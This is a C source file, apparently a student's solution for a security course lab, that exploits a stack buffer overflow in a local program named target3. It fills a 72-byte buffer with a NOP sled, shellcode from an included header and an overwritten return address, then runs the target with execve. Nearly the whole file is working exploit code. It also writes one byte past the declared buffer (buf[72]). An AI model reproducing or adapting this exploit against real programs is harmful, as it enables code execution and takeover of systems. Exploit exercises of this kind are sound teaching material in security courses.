#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
/*
 * ___frame for foo__
 *
 * 0x2021fe58   return addr for foo <---overflow buf till here(store &buf[4] here)
 * 0x2021fe50   sfp
 * ..
 * ..
 * 0x2021fe14   buf[4] <---start of our attack string
 * 0x2021fe13   buf[3] = "A"
 * ..
 * 0x2021fe10   buf[0] = "A"
 *
 * Explanation:
 * 0x2021fe58 - 0x2021fe10 = 72B = return of foo - start of buf
 */
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
    int i = 0;
	args[0] = TARGET;
    char buf[72];    
    //insert 3 NOPS to word align 45B shellcode
    for(i = 0;i<12;i++)
        buf[i] = '\x90';

    //insert more NOPS
    //for(;i<22;i++)
      //  buf[i] = '\x90';
    //insert SHELL CODE (45 bytes)
    for(;i<57;i++)
        buf[i] = shellcode[i-12];

    for(;i<68;i++)
        buf[i] = '\x90';
    //for(;i<72;i=i+4){ 
    //insert addr of buff[4] = 0x2021fe14
     //   buf[i+4] = '\x00'
        buf[72] = '\x00';
        buf[71] = '\x20';
        buf[70] = '\x21';
        buf[69] = '\xfe';
        buf[68] = '\x14';
   // }
    printf("buf len %d \n", strlen(buf));
    
    args[1] = buf;
    args[2] =  NULL;
    env[0] = NULL;
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
